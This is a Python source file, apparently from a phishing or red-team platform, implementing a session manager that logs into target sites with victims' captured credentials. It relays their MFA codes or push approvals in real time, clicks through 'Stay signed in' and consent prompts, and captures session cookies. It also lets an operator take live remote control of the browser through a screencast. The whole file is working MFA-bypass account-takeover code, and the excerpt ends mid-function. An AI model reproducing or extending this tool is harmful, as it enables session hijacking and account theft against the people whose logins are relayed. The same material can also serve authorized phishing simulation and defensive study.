"""
Synchronous credential proxy session manager.

Manages Playwright browser sessions that persist across HTTP request/response
cycles, enabling real-time MFA relay.
"""
import asyncio
import logging
import queue
import threading
import time
import uuid
from typing import Dict, Any, Optional

logger = logging.getLogger(__name__)


class SyncProxySession:
    """
    A single browser session that persists across HTTP requests.

    Runs its own daemon thread with an asyncio event loop + Playwright browser.
    HTTP handler communicates via two queue.Queue objects:
      - _command_queue: HTTP thread -> browser thread (commands)
      - _result_queue: browser thread -> HTTP thread (results)
    """

    def __init__(self, target_url: str, credentials: Dict[str, str],
                 config: Dict[str, Any]):
        self.session_id = str(uuid.uuid4())
        self.target_url = target_url
        self.credentials = credentials
        self.config = config
        self.created_at = time.time()
        self.last_activity = time.time()
        self.state = 'initial'  # initial → running → operator_available → screencast → closed

        self._command_queue: queue.Queue = queue.Queue()
        self._result_queue: queue.Queue = queue.Queue()
        self._frame_queue: queue.Queue = queue.Queue(maxsize=5)
        self._thread: Optional[threading.Thread] = None
        self._running = False
        self._approved_result: Optional[dict] = None  # cached by check_status on approval
        self._current_url: Optional[str] = None
        self._page_title: Optional[str] = None
        self._screencast_metadata: Optional[dict] = None

        # Start the browser thread
        self._running = True
        self.state = 'running'
        self._thread = threading.Thread(
            target=self._browser_thread_main, daemon=True
        )
        self._thread.start()

    # -- Public methods called from HTTP handler (blocking) --

    def execute_initial(self, timeout: int = 30) -> dict:
        """Navigate to target, fill credentials, submit, analyse result."""
        self.last_activity = time.time()
        self._command_queue.put({'type': 'initial'})
        try:
            result = self._result_queue.get(timeout=timeout)
            self.last_activity = time.time()
            return result
        except queue.Empty:
            return {'status': 'failed', 'error': 'Timeout waiting for initial proxy result'}

    def execute_continue(self, user_input: str, timeout: int = 30) -> dict:
        """Fill MFA input, submit, analyse result."""
        self.last_activity = time.time()

        # Fast-path for number-matching / push approval: check_status already
        # captured cookies and cached the result.  Return it directly without
        # touching the queue — this eliminates the race condition where a late
        # check_status result lands on the queue between drain and get().
        if user_input == 'approved' and self._approved_result:
            logger.info("Returning cached approval result (bypassing queue)")
            result = self._approved_result
            self._approved_result = None  # consume once
            return result

        # Drain stale results from previous timed-out check_status calls.
        drained = 0
        while not self._result_queue.empty():
            try:
                self._result_queue.get_nowait()
                drained += 1
            except queue.Empty:
                break
        if drained:
            logger.info(f"Drained {drained} stale result(s) from queue before execute_continue")
        self._command_queue.put({'type': 'continue', 'user_input': user_input})
        try:
            result = self._result_queue.get(timeout=timeout)
            self.last_activity = time.time()
            return result
        except queue.Empty:
            return {'status': 'failed', 'error': 'Timeout waiting for MFA proxy result'}

    def check_status(self, timeout: int = 2) -> dict:
        """Non-blocking page state check (for number-matching polling)."""
        self.last_activity = time.time()
        self._command_queue.put({'type': 'check_status'})
        try:
            result = self._result_queue.get(timeout=timeout)
            return result
        except queue.Empty:
            return {'status': 'waiting'}

    # -- Screencast methods (called from WebSocket handler) --

    def start_screencast(self):
        """Start CDP screencast — frames appear on _frame_queue."""
        self.last_activity = time.time()
        self.state = 'screencast'
        self._command_queue.put({'type': 'start_screencast'})

    def stop_screencast(self):
        """Stop CDP screencast."""
        self._command_queue.put({'type': 'stop_screencast'})
        if self.state == 'screencast':
            self.state = 'operator_available'

    def get_frame(self, timeout: float = 1.0) -> Optional[dict]:
        """Blocking read of the next screencast frame. Returns None on timeout."""
        try:
            return self._frame_queue.get(timeout=timeout)
        except queue.Empty:
            return None

    def send_input(self, event: dict):
        """Send a mouse/keyboard/scroll input event to the browser."""
        self.last_activity = time.time()
        self._command_queue.put({'type': 'input', 'event': event})

    def navigate(self, url: str, timeout: int = 30) -> dict:
        """Navigate the browser to a new URL."""
        self.last_activity = time.time()
        self._command_queue.put({'type': 'navigate_to', 'url': url})
        try:
            return self._result_queue.get(timeout=timeout)
        except queue.Empty:
            return {'success': False, 'error': 'Navigation timeout'}

    def export_cookies(self, timeout: int = 5) -> list:
        """Get current cookies from the browser context."""
        self.last_activity = time.time()
        self._command_queue.put({'type': 'get_cookies'})
        try:
            result = self._result_queue.get(timeout=timeout)
            return result.get('cookies', [])
        except queue.Empty:
            return []

    def get_current_url(self) -> str:
        return self._current_url or self.target_url

    def get_page_title(self) -> str:
        return self._page_title or ''

    def cleanup(self):
        """Send shutdown command and join thread."""
        self._running = False
        self.state = 'closed'
        try:
            self._command_queue.put({'type': 'shutdown'})
        except Exception:
            pass
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=10)

    # -- Browser thread --

    def _browser_thread_main(self):
        """Main entry for the daemon thread — runs its own event loop."""
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(self._browser_loop(loop))
        except Exception as e:
            logger.exception(f"SyncProxySession browser thread crashed: {e}")
        finally:
            try:
                if not loop.is_closed():
                    pending = asyncio.all_tasks(loop)
                    for task in pending:
                        task.cancel()
                    if pending:
                        loop.run_until_complete(
                            asyncio.gather(*pending, return_exceptions=True)
                        )
                    loop.close()
            except Exception:
                pass

    async def _browser_loop(self, loop: asyncio.AbstractEventLoop):
        """Async loop: initialise browser, then await commands from the queue."""
        from shared.browser_automation import BrowserAutomationService
        from shared.ai_form_detector import AIFormDetector

        automation = BrowserAutomationService()
        ai_detector = AIFormDetector(self.config.get('ai_config') or {})
        page = None

        try:
            await automation.initialize(self.config.get('browser_config') or {})

            while self._running:
                # Wait for command from HTTP thread (non-blocking in async)
                try:
                    command = await loop.run_in_executor(
                        None, lambda: self._command_queue.get(timeout=1)
                    )
                except queue.Empty:
                    continue

                cmd_type = command.get('type')

                if cmd_type == 'shutdown':
                    break

                elif cmd_type == 'initial':
                    try:
                        result, page = await self._handle_initial(
                            automation, ai_detector, page
                        )
                        self._result_queue.put(result)
                    except Exception as e:
                        logger.exception(f"Error in initial proxy step: {e}")
                        self._result_queue.put({
                            'status': 'failed', 'error': str(e)
                        })

                elif cmd_type == 'continue':
                    try:
                        result = await self._handle_continue(
                            automation, page, command.get('user_input', '')
                        )
                        self._result_queue.put(result)
                    except Exception as e:
                        logger.exception(f"Error in continue proxy step: {e}")
                        self._result_queue.put({
                            'status': 'failed', 'error': str(e)
                        })

                elif cmd_type == 'check_status':
                    try:
                        result = await self._handle_check_status(page)
                        self._result_queue.put(result)
                    except Exception as e:
                        logger.exception(f"Error in check_status: {e}")
                        self._result_queue.put({'status': 'waiting'})

                elif cmd_type == 'start_screencast':
                    try:
                        await self._handle_start_screencast(page)
                    except Exception as e:
                        logger.exception(f"Error starting screencast: {e}")

                elif cmd_type == 'stop_screencast':
                    try:
                        await self._handle_stop_screencast()
                    except Exception as e:
                        logger.exception(f"Error stopping screencast: {e}")

                elif cmd_type == 'input':
                    try:
                        await self._handle_input(page, command.get('event', {}))
                    except Exception as e:
                        logger.debug(f"Error handling input: {e}")

                elif cmd_type == 'navigate_to':
                    try:
                        await page.goto(command['url'], wait_until='domcontentloaded', timeout=30000)
                        self._current_url = page.url
                        self._page_title = await page.title()
                        self._result_queue.put({'success': True, 'url': page.url})
                    except Exception as e:
                        logger.error(f"Navigation error: {e}")
                        self._result_queue.put({'success': False, 'error': str(e)})

                elif cmd_type == 'get_cookies':
                    try:
                        cookies = await page.context.cookies()
                        self._result_queue.put({'cookies': cookies})
                    except Exception as e:
                        logger.error(f"Error getting cookies: {e}")
                        self._result_queue.put({'cookies': []})

                # Update tracked URL/title after any command
                if page:
                    try:
                        self._current_url = page.url
                        self._page_title = await page.title()
                    except Exception:
                        pass

        finally:
            # Clean up CDP session, page, and browser
            await self._handle_stop_screencast()
            if page:
                try:
                    await page.close()
                except Exception:
                    pass
            try:
                await automation.cleanup()
            except Exception:
                pass

    # -- CDP screencast + input handlers --

    _cdp_session = None

    async def _handle_start_screencast(self, page):
        """Start CDP screencast, streaming JPEG frames to _frame_queue."""
        if not page:
            return
        if self._cdp_session:
            await self._handle_stop_screencast()

        self._cdp_session = await page.context.new_cdp_session(page)

        def on_frame(params):
            frame_data = {
                'data': params['data'],
                'metadata': params.get('metadata', {}),
                'sessionId': params.get('sessionId'),
            }
            self._screencast_metadata = params.get('metadata')
            try:
                if self._frame_queue.full():
                    try:
                        self._frame_queue.get_nowait()
                    except queue.Empty:
                        pass
                self._frame_queue.put_nowait(frame_data)
            except queue.Full:
                pass
            # Ack the frame to keep receiving
            try:
                import asyncio as _aio
                loop = _aio.get_event_loop()
                if self._cdp_session:
                    loop.create_task(
                        self._cdp_session.send('Page.screencastFrameAck',
                                               {'sessionId': params.get('sessionId', 0)})
                    )
            except Exception:
                pass

        self._cdp_session.on('Page.screencastFrame', on_frame)
        await self._cdp_session.send('Page.startScreencast', {
            'format': 'jpeg',
            'quality': 60,
            'maxWidth': 1920,
            'maxHeight': 1080,
            'everyNthFrame': 1,
        })
        logger.info(f"Screencast started for session {self.session_id}")

    async def _handle_stop_screencast(self):
        """Stop CDP screencast and close the CDP session."""
        if self._cdp_session:
            try:
                await self._cdp_session.send('Page.stopScreencast')
            except Exception:
                pass
            try:
                await self._cdp_session.detach()
            except Exception:
                pass
            self._cdp_session = None
            logger.info(f"Screencast stopped for session {self.session_id}")

    async def _handle_input(self, page, event: dict):
        """Dispatch mouse/keyboard/scroll input via CDP."""
        if not page or not self._cdp_session:
            return
        evt_type = event.get('type')
        try:
            if evt_type == 'mouse':
                action = event.get('action', 'click')
                x = event.get('x', 0)
                y = event.get('y', 0)
                button = event.get('button', 'left')
                if action == 'click':
                    await self._cdp_session.send('Input.dispatchMouseEvent', {
                        'type': 'mousePressed', 'x': x, 'y': y,
                        'button': button, 'clickCount': 1,
                    })
                    await self._cdp_session.send('Input.dispatchMouseEvent', {
                        'type': 'mouseReleased', 'x': x, 'y': y,
                        'button': button, 'clickCount': 1,
                    })
                elif action == 'down':
                    await self._cdp_session.send('Input.dispatchMouseEvent', {
                        'type': 'mousePressed', 'x': x, 'y': y,
                        'button': button, 'clickCount': 1,
                    })
                elif action == 'up':
                    await self._cdp_session.send('Input.dispatchMouseEvent', {
                        'type': 'mouseReleased', 'x': x, 'y': y,
                        'button': button, 'clickCount': 1,
                    })
                elif action == 'move':
                    await self._cdp_session.send('Input.dispatchMouseEvent', {
                        'type': 'mouseMoved', 'x': x, 'y': y,
                    })
            elif evt_type == 'key':
                action = event.get('action', 'down')
                key = event.get('key', '')
                code = event.get('code', '')
                text = event.get('text', '')
                modifiers = event.get('modifiers', 0)
                if action == 'down':
                    params = {'type': 'keyDown', 'key': key, 'code': code, 'modifiers': modifiers}
                    if text and len(text) == 1:
                        params['text'] = text
                    await self._cdp_session.send('Input.dispatchKeyEvent', params)
                elif action == 'up':
                    await self._cdp_session.send('Input.dispatchKeyEvent', {
                        'type': 'keyUp', 'key': key, 'code': code, 'modifiers': modifiers,
                    })
                elif action == 'press':
                    params = {'type': 'keyDown', 'key': key, 'code': code, 'modifiers': modifiers}
                    if text and len(text) == 1:
                        params['text'] = text
                    await self._cdp_session.send('Input.dispatchKeyEvent', params)
                    await self._cdp_session.send('Input.dispatchKeyEvent', {
                        'type': 'keyUp', 'key': key, 'code': code, 'modifiers': modifiers,
                    })
            elif evt_type == 'scroll':
                x = event.get('x', 0)
                y = event.get('y', 0)
                await self._cdp_session.send('Input.dispatchMouseEvent', {
                    'type': 'mouseWheel', 'x': x, 'y': y,
                    'deltaX': event.get('deltaX', 0),
                    'deltaY': event.get('deltaY', 0),
                })
        except Exception as e:
            logger.debug(f"Input dispatch error: {e}")

    # -- Async handler methods --

    async def _handle_initial(self, automation, ai_detector, existing_page):
        """Navigate to target, detect form, fill credentials, submit, analyse.

        Supports multi-step login flows (e.g. email page → password page → MFA)
        by looping up to MAX_STEPS times, filling whatever fields are visible
        on each page.
        """
        MAX_STEPS = 5
        timeout_sec = self.config.get('timeout', 30)
        timeout_ms = int(timeout_sec) * 1000

        # Navigate
        page = await automation.navigate_to_site(self.target_url, timeout=timeout_ms)

        # Track which standard credential fields still need to be filled
        remaining_creds = dict(self.credentials)  # shallow copy
        step_screenshots = []  # capture screenshot at each step for debugging

        for step in range(MAX_STEPS):
            logger.info(f"Multi-step login: step {step + 1}/{MAX_STEPS}")

            # Screenshot + HTML → AI detect form fields
            html = await automation.get_page_html(page)
            try:
                screenshot = await automation.take_screenshot(page, full_page=False)
            except Exception:
                screenshot = b''

            form_fields = ai_detector.detect_form_fields(screenshot, html)
            logger.info(f"Multi-step login step {step + 1}: detected fields: {form_fields}")

            # Build credential mapping for REMAINING credentials only
            credential_mapping = self._build_credential_mapping(
                form_fields, remaining_creds, ai_detector, html
            )
            logger.info(f"Multi-step login step {step + 1}: credential mapping: {credential_mapping}")

            if not credential_mapping:
                # Before breaking, check for interstitial pages that need a click
                # (account pickers, "Stay signed in?", consent prompts, etc.)
                clicked = await self._handle_interstitial(page)
                if clicked:
                    # Interstitial handled — continue loop to detect next page's fields
                    logger.info(f"Multi-step login step {step + 1}: handled interstitial, continuing")
                    await self._record_step_screenshot(
                        step_screenshots, step, page,
                        f"Step {step + 1}: clicked interstitial",
                    )
                    continue
                # No interstitial detected — genuinely no fields to fill
                logger.info(f"Multi-step login step {step + 1}: no credential mapping found, breaking")
                break

            # Fill whatever fields are visible
            fill_result = await automation.fill_available_credentials(
                page, remaining_creds, credential_mapping
            )
            logger.info(f"Multi-step login step {step + 1}: fill result: {fill_result}")

            if not fill_result['filled']:
                # AI/fallback returned selectors but they didn't match anything on
                # the page — try interstitial detection before giving up.
                clicked = await self._handle_interstitial(page)
                if clicked:
                    logger.info(f"Multi-step login step {step + 1}: handled interstitial after empty fill, continuing")
                    await self._record_step_screenshot(
                        step_screenshots, step, page,
                        f"Step {step + 1}: clicked interstitial",
                    )
                    continue
                logger.info(f"Multi-step login step {step + 1}: nothing filled and no interstitial, breaking")
                break

            # Capture step screenshot (before submit) for debugging
            await self._record_step_screenshot(
                step_screenshots, step, page,
                f"Step {step + 1}: filled {', '.join(fill_result['filled'])}",
            )

            # Remove filled fields from remaining
            for field_name in fill_result['filled']:
                remaining_creds.pop(field_name, None)

            # Submit form
            submit_button = form_fields.get('submit_button')
            await automation.submit_form(page, submit_button)
            try:
                await page.wait_for_load_state('domcontentloaded', timeout=2000)
            except Exception:
                pass

            # Safety net: if the new page still has a visible password input,
            # our earlier "password fill" was bogus (e.g. hidden field on email-only page).
            # Re-add password to remaining so the next iteration can fill it properly.
            if 'password' not in remaining_creds and 'password' in self.credentials:
                try:
                    pw_visible = await page.query_selector('input[type="password"]:visible')
                    if pw_visible and await pw_visible.is_visible():
                        remaining_creds['password'] = self.credentials['password']
                        logger.info(f"Multi-step login step {step + 1}: password input still visible after submit, re-queuing")
                except Exception:
                    pass

            # If no remaining standard creds (email/username/password), we're done filling
            standard_remaining = {k for k in remaining_creds if k in ('email', 'username', 'password')}
            if not standard_remaining:
                logger.info(f"Multi-step login: all standard credentials filled after step {step + 1}")
                break

        # Analyse page after all steps
        result = await self._analyze_page_after_submit(page, automation)
        if step_screenshots:
            result['step_screenshots'] = step_screenshots
        return result, page

    async def _handle_continue(self, automation, page, user_input: str):
        """Detect MFA input on current page, fill it, submit, analyse."""
        if not page:
            return {'status': 'failed', 'error': 'No active page'}

        # For number-matching / push flows the hidden form submits "approved".
        # The page has already navigated (detected by polling). Just capture
        # cookies and return success — don't try to fill any MFA fields.
        if user_input == 'approved':
            logger.info("Number-matching approval continuation — capturing session")
            cookies = []
            try:
                cookies = await page.context.cookies()
            except Exception:
                pass
            final_url = page.url
            page_title = await page.title()
            result = {
                'status': 'success',
                'cookies': cookies,
                'final_url': final_url,
                'page_title': page_title,
            }
            screenshot = await self._take_result_screenshot(page)
            if screenshot:
                result['screenshot'] = screenshot
            return result

        # For number-matching / push flows the target page may have already
        # navigated to a success page (via its own JS) before we get here.
        # Check for that first — no need to fill any fields.
        pre_check = await self._analyze_page_after_submit(page, automation)
        if pre_check.get('status') == 'success':
            logger.info("Page already shows success (push/number-match approved)")
            return pre_check

        # Find visible input fields on the page
        mfa_filled = False
        mfa_selectors = [
            'input[type="text"]:visible',
            'input[type="number"]:visible',
            'input[type="tel"]:visible',
            'input[name*="code"]:visible',
            'input[name*="otp"]:visible',
            'input[name*="mfa"]:visible',
            'input[name*="token"]:visible',
            'input[name*="verification"]:visible',
            'input[id*="code"]:visible',
            'input[id*="otp"]:visible',
            'input[autocomplete="one-time-code"]:visible',
        ]

        for selector in mfa_selectors:
            try:
                element = await page.query_selector(selector)
                if element:
                    await element.fill(user_input)
                    mfa_filled = True
                    logger.info(f"Filled MFA input with selector: {selector}")
                    break
            except Exception:
                continue

        if not mfa_filled:
            # Fallback: try any visible text input
            try:
                inputs = await page.query_selector_all('input:visible')
                for inp in inputs:
                    inp_type = await inp.get_attribute('type') or 'text'
                    if inp_type in ('text', 'number', 'tel', 'password'):
                        # Skip if it looks like username/email (already filled)
                        name = (await inp.get_attribute('name') or '').lower()
                        autocomplete = (await inp.get_attribute('autocomplete') or '').lower()
                        if any(skip in name for skip in ('user', 'email', 'login')):
                            continue
                        if any(skip in autocomplete for skip in ('username', 'email')):
                            continue
                        await inp.fill(user_input)
                        mfa_filled = True
                        logger.info("Filled MFA using fallback visible input")
                        break
            except Exception as e:
                logger.warning(f"Fallback MFA fill failed: {e}")

        if not mfa_filled:
            return {'status': 'failed', 'error': 'Could not find MFA input field'}

        # Submit
        submit_selectors = [
            'button[type="submit"]:visible',
            'input[type="submit"]:visible',
            'button:has-text("Verify"):visible',
            'button:has-text("Submit"):visible',
            'button:has-text("Continue"):visible',
            'button:has-text("Confirm"):visible',
            'button:has-text("Sign in"):visible',
            'button:has-text("Next"):visible',
        ]

        submitted = False
        for selector in submit_selectors:
            try:
                element = await page.query_selector(selector)
                if element:
                    await element.click()
                    submitted = True
                    break
            except Exception:
                continue

        if not submitted:
            await page.keyboard.press('Enter')

        try:
            await page.wait_for_load_state('networkidle', timeout=10000)
        except Exception:
            pass
        # Brief safety pad for late JS — networkidle already covered the heavy lifting
        await asyncio.sleep(0.3)

        return await self._analyze_page_after_submit(page, automation)

    async def _handle_check_status(self, page):
        """Check if target page state changed (for number-matching polling).

        After number-matching approval, the target site navigates away from the
        approval page. We detect this by checking whether the page still shows
        number-matching keywords. If not, approval happened.
        """
        if not page:
            return {'status': 'waiting'}

        try:
            # Quick check: does the page still look like a number-matching prompt?
            try:
                body_text = await page.inner_text('body')
                body_lower = body_text.lower()
            except Exception:
                return {'status': 'waiting'}

            number_match_keywords = ['approve', 'authenticator app', 'confirm the number',
                                     'select the number', 'enter the number',
                                     'authenticating on', 'authentication in progress']
            still_on_number_page = any(kw in body_lower for kw in number_match_keywords)

            if still_on_number_page:
                return {'status': 'waiting'}

            # Page changed — approval happened.
            logger.info("Number-matching page changed — treating as approved")

            # Handle "Stay signed in?" interstitial (e.g. Microsoft)
            # Click "Yes" to get the full session cookies before capturing.
            try:
                stay_signed_in_keywords = ['stay signed in', 'keep me signed in',
                                           'remain signed in', 'don\'t show this again']
                if any(kw in body_lower for kw in stay_signed_in_keywords):
                    logger.info("Detected 'Stay signed in?' page — clicking Yes")
                    yes_btn = await page.query_selector(
                        'button:has-text("Yes"), input[type="submit"][value="Yes"], '
                        'button:has-text("Accept"), input[type="submit"][value="Accept"]'
                    )
                    if yes_btn:
                        await yes_btn.click()
                        try:
                            await page.wait_for_load_state('networkidle', timeout=5000)
                        except Exception:
                            pass
                        await asyncio.sleep(0.3)
                        logger.info(f"Clicked Yes — now on {page.url}")
            except Exception as e:
                logger.debug(f"Stay-signed-in check failed (non-fatal): {e}")

            # Capture cookies and screenshot.
            cookies = []
            try:
                cookies = await page.context.cookies()
            except Exception:
                pass

            final_url = page.url
            page_title = await page.title()

            success_result = {
                'status': 'success',
                'cookies': cookies,
                'final_url': final_url,
                'page_title': page_title,
            }
            screenshot = await self._take_result_screenshot(page)
            if screenshot:
                success_result['screenshot'] = screenshot

            # Cache the success result so execute_continue("approved") can
            # return it directly without going through the queue.  This avoids
            # race conditions where a late check_status result gets consumed
            # by execute_continue instead of the real continue result.
            self._approved_result = success_result
            logger.info("Cached approval result for execute_continue fast-path")

            return {'status': 'approved', 'result': success_result}

        except Exception as e:
            logger.debug(f"check_status error: {e}")
            return {'status': 'waiting'}

    async def _handle_interstitial(self, page) -> bool:
        """Detect and click through interstitial pages (account pickers, consent, etc.)."""
        # MS and similar heavy client-rendered sites stage rendering: the
        # footer appears first, then the main interactive card hydrates.
        # Wait for an interactive element (button/input/link) to appear, OR
        # for a substantial body text length, before pattern-matching.
        body_text = ''
        for _ in range(20):  # up to ~6s
            try:
                # Check for interactive elements first — most reliable signal
                interactive = await page.query_selector(
                    'button, input, a[href], [role="button"]'
                )
                body_text = await page.inner_text('body')
            except Exception:
                interactive = None
                body_text = ''
            if interactive and body_text and len(body_text.strip()) > 100:
                break
            await asyncio.sleep(0.3)
        if not body_text:
            logger.warning("[interstitial] body still empty after retry, giving up")
            return False
        body_lower = body_text.lower()

        # 1. Account picker (Microsoft: "Work or school account" vs "Personal account")
        account_picker_keywords = ['work or school', 'personal account',
                                   'which account', 'more than one account',
                                   'select account', 'choose an account']
        if any(kw in body_lower for kw in account_picker_keywords):
            logger.info("Detected account picker page")
            # Prefer "Work or school account" for corporate targets
            work_selectors = [
                '[data-test-id="Tile_WorkAccount"]',          # Microsoft data attribute
                'div:has-text("Work or school account")',
                'div:has-text("Work or school")',
                'li:has-text("Work or school")',
            ]
            for selector in work_selectors:
                try:
                    el = await page.query_selector(selector)
                    if el:
                        await el.click()
                        try:
                            await page.wait_for_load_state('networkidle', timeout=5000)
                        except Exception:
                            pass
                        await asyncio.sleep(0.3)
                        logger.info(f"Clicked 'Work or school account' — now on {page.url}")
                        return True
                except Exception:
                    continue
            # Fallback: click the first tile/option that isn't "Back"
            try:
                tiles = await page.query_selector_all('[role="button"], [data-test-id*="Tile"]')
                for tile in tiles:
                    text = (await tile.inner_text()).lower()
                    if 'back' not in text and len(text.strip()) > 0:
                        await tile.click()
                        try:
                            await page.wait_for_load_state('networkidle', timeout=5000)
                        except Exception:
                            pass
                        await asyncio.sleep(0.3)
                        logger.info(f"Clicked first account tile — now on {page.url}")
                        return True
            except Exception:
                pass

        # 2. "Stay signed in?" (can also appear mid-flow, not just after MFA)
        stay_signed_in_keywords = ['stay signed in', 'keep me signed in',
                                   'remain signed in']
        if any(kw in body_lower for kw in stay_signed_in_keywords):
            logger.info("Detected 'Stay signed in?' interstitial")
            yes_btn = await page.query_selector(
                'button:has-text("Yes"), input[type="submit"][value="Yes"]'
            )
            if yes_btn:
                await yes_btn.click()
                try:
                    await page.wait_for_load_state('networkidle', timeout=5000)
                except Exception:
                    pass
                await asyncio.sleep(0.3)
                logger.info(f"Clicked Yes — now on {page.url}")
                return True

        # 3. Verification-method picker ("Get a code to sign in" / similar).
        # Microsoft passwordless flows show this after email entry: it's a
        # button-only page asking the user to choose how to receive their code.
        # Prefer "Send a code" (OTP via email) over "Send notification" (push) —
        # OTP is a single user input, push needs the right device on hand.
        verify_picker_keywords = [
            'get a code to sign in',
            "we'll send a sign-in request",
            'we will send a sign-in request',
            'how would you like to sign in',
            'verify your identity',
        ]
        matched_kw = next((kw for kw in verify_picker_keywords if kw in body_lower), None)
        if matched_kw:
            logger.warning(f"[interstitial] verification-method picker matched on '{matched_kw}'")
            # Prefer the primary push button ("Send notification") — it's the
            # default MS users tap, and it transitions to a number-matching
            # display which we already handle correctly.
            push_selectors = [
                'button:has-text("Send notification")',
                '*[role="button"]:has-text("Send notification")',
                '*:has-text("Send sign-in request")',
                'button:has-text("Approve")',
            ]
            for selector in push_selectors:
                try:
                    el = await page.query_selector(selector)
                    if el:
                        await el.click()
                        try:
                            await page.wait_for_load_state('networkidle', timeout=5000)
                        except Exception:
                            pass
                        await asyncio.sleep(0.3)
                        logger.warning(f"[interstitial] clicked 'Send notification' option — now on {page.url}")
                        return True
                except Exception:
                    continue
            # Fall back to OTP if push isn't available
            send_code_selectors = [
                'a:has-text("Send a code to")',
                'button:has-text("Send a code to")',
                '*:has-text("Email a code")',
                'a:has-text("Send code")',
                'button:has-text("Send code")',
            ]
            for selector in send_code_selectors:
                try:
                    el = await page.query_selector(selector)
                    if el:
                        await el.click()
                        try:
                            await page.wait_for_load_state('networkidle', timeout=5000)
                        except Exception:
                            pass
                        await asyncio.sleep(0.3)
                        logger.warning(f"[interstitial] clicked 'Send a code' option — now on {page.url}")
                        return True
                except Exception:
                    continue
            logger.warning("[interstitial] picker matched but no clickable target found")

        # 4. Consent / permissions prompts
        consent_keywords = ['permissions requested', 'consent', 'allow access',
                            'authorize', 'grant access']
        if any(kw in body_lower for kw in consent_keywords):
            logger.info("Detected consent/permissions interstitial")
            accept_btn = await page.query_selector(
                'button:has-text("Accept"), button:has-text("Yes"), '
                'button:has-text("Allow"), input[type="submit"][value="Accept"]'
            )
            if accept_btn:
                await accept_btn.click()
                try:
                    await page.wait_for_load_state('networkidle', timeout=5000)
                except Exception:
                    pass
                await asyncio.sleep(0.3)
                logger.info(f"Clicked Accept — now on {page.url}")
                return True

        # Nothing matched — log the page text we saw so we can extend the handler
        try:
            preview = body_text[:300].replace('\n', ' ')
            logger.warning(f"[interstitial] no match on page; first 300 chars: {preview!r}")
        except Exception:
            pass
        return False

    async def _record_step_screenshot(self, step_screenshots: list, step: int,
                                      page, label: str) -> None:
        """Capture a screenshot of the current page and append it to the
        step_screenshots list. Used to record state at each step transition
        (credential fills, interstitial clicks) for debugging."""
        shot = await self._take_result_screenshot(page)
        if shot:
            step_screenshots.append({
                'step': step + 1,
                'label': label,
                'url': page.url,
                'screenshot': shot,
            })

    async def _take_result_screenshot(self, page) -> Optional[str]:
        """Take a screenshot and return base64-encoded string, or None on failure."""
        try:
            import base64, io
            screenshot = await page.screenshot(full_page=False)
            max_size = 500 * 1024
            if len(screenshot) > max_size:
                try:
                    from PIL import Image
                    img = Image.open(io.BytesIO(screenshot))
                    if img.width > 1920 or img.height > 1080:
                        img.thumbnail((1920, 1080), Image.Resampling.LANCZOS)
                    output = io.BytesIO()
                    img.save(output, format='PNG', optimize=True, quality=85)
                    screenshot = output.getvalue()
                    if len(screenshot) > max_size:
                        output = io.BytesIO()
                        img.save(output, format='JPEG', quality=70)
                        screenshot = output.getvalue()
                except ImportError:
                    pass
            encoded = base64.b64encode(screenshot).decode('utf-8')
            if len(encoded) < 1024 * 1024:
                return encoded
        except Exception as e:
            logger.debug(f"Screenshot capture failed: {e}")
        return None

    async def _analyze_page_after_submit(self, page, automation) -> dict:
        """
        Analyse the current page state after a form submit. Returns one of:
          - {'status': 'success', 'cookies': [...], 'final_url': '...', 'page_title': '...'}
          - {'status': 'needs_input', 'prompt_text': '...', 'input_type': 'text|number'}
          - {'status': 'needs_display', 'display_value': '42', 'prompt_text': '...'}
          - {'status': 'failed', 'error': '...', 'error_messages': [...]}
        """
        try:
            final_url = page.url
            page_title = await page.title()

            # 0. Wait for client-side hydration. Heavy SPA targets (MS, Okta,
            # Google) render the footer immediately but hydrate the main card
            # asynchronously. Reading body text or querying inputs before
            # hydration gives empty/wrong results and races detection branches
            # into the wrong outcome. Block until we see real interactive
            # content or hit a timeout (~6s).
            for _ in range(20):
                try:
                    interactive = await page.query_selector(
                        'input, button, a[href], [role="button"]'
                    )
                    body_probe = await page.inner_text('body')
                except Exception:
                    interactive = None
                    body_probe = ''
                if interactive and body_probe and len(body_probe.strip()) > 100:
                    break
                await asyncio.sleep(0.3)

            # 1. Check for error messages
            if automation:
                error_messages = await automation._detect_error_messages(page)
            else:
                error_messages = []

            if error_messages:
                # Check if these are MFA-related prompts vs actual errors
                mfa_keywords = ['code', 'verify', 'verification', 'authenticat',
                                'two-factor', '2fa', 'mfa', 'one-time', 'otp']
                is_mfa_prompt = any(
                    any(kw in msg.lower() for kw in mfa_keywords)
                    for msg in error_messages
                )
                if not is_mfa_prompt:
                    return {
                        'status': 'failed',
                        'error': 'Login failed',
                        'error_messages': error_messages,
                        'final_url': final_url,
                        'page_title': page_title,
                    }

            # 2. Check for visible MFA-candidate input fields.
            # Find any visible text/number/tel input that doesn't look like
            # username/email/password — that's almost certainly an MFA code field.
            # We use is_visible() per-element instead of the :visible CSS pseudo,
            # which can return None inside attribute selectors and miss inputs.
            mfa_candidate_input = None
            mfa_candidate_type = 'text'
            try:
                all_inputs = await page.query_selector_all('input')
                for inp in all_inputs:
                    try:
                        if not await inp.is_visible():
                            continue
                    except Exception:
                        continue
                    inp_type = (await inp.get_attribute('type') or 'text').lower()
                    if inp_type not in ('text', 'number', 'tel'):
                        continue
                    name = (await inp.get_attribute('name') or '').lower()
                    autocomplete = (await inp.get_attribute('autocomplete') or '').lower()
                    # Skip username/email/password fields
                    if any(skip in name for skip in ('user', 'email', 'login')):
                        continue
                    if name == 'password' or 'password' in autocomplete:
                        continue
                    if autocomplete in ('username', 'email'):
                        continue
                    mfa_candidate_input = inp
                    mfa_candidate_type = 'number' if inp_type == 'number' else 'text'
                    break
            except Exception:
                pass

            if mfa_candidate_input is not None:
                prompt_text = await self._get_mfa_prompt_text(page)
                result = {
                    'status': 'needs_input',
                    'prompt_text': prompt_text or 'Enter the verification code',
                    'input_type': mfa_candidate_type,
                    'final_url': final_url,
                }
                shot = await self._take_result_screenshot(page)
                if shot:
                    result['screenshot'] = shot
                return result

            # 3a. No MFA input found — check for passkey/WebAuthn pages.
            # We can't relay these (no virtual authenticator), so detect the
            # state and return a meaningful failure rather than generic "could
            # not determine login result".
            try:
                body_text_for_passkey = await page.inner_text('body')
                body_lower_pk = body_text_for_passkey.lower()
                passkey_keywords = [
                    'passkey', 'use your passkey', 'verify with passkey',
                    'sign in with passkey', 'security key', 'use a security key',
                    'windows hello', 'webauthn', 'fido',
                    'use a different verification', 'use another method',
                ]
                if any(kw in body_lower_pk for kw in passkey_keywords):
                    return {
